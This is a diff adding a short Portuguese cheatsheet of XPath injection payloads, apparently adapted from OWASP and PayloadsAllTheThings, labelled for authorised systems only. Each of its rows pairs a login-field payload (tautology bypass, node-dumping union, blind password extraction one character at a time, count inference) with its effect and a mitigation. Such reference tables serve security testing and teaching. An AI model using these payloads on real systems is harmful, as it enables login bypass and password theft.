@@ -1,0 +1,9 @@
+# XPath Injection - cheatsheet (reimplementado de OWASP / PayloadsAllTheThings)
+# USO SOMENTE em sistemas proprios/autorizados.
+#
+# PAYLOAD (no campo pass/user)                | EFEITO                                | MITIGACAO
+' or '1'='1                                   | tautologia: casa com todos (bypass)   | XPathVariableResolver
+' or ''='                                     | idem (variacao)                       | idem
+x']|//user['1'='1                             | union: retorna TODOS os nos (dump)    | idem
+admin' and substring(pass,1,1)='S            | blind: extrai a senha 1 char por vez  | idem
+count(//user)=2 and '1'='1                    | inferencia por contagem (blind)       | idem
